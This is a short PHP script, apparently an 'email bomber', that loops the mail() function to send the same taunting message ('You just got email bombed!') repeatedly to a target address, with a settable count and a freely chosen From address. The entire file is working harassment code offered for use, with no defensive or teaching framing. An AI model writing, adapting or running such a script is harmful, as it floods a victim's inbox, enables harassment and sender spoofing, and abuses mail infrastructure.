<?php

$targetmail = "target@email.com";
$subject = "BOOM!";
$message = "You just got email bombed!";
$amount = 10;
$sentmail = 1; //Do not change
$frommail = "your@email.com"; // sender


while($sentmail<=$amount)

{
	
	mail($targetmail, $subject, $message, "From: $frommail\n");
  $sentmail++;
	
}
?>
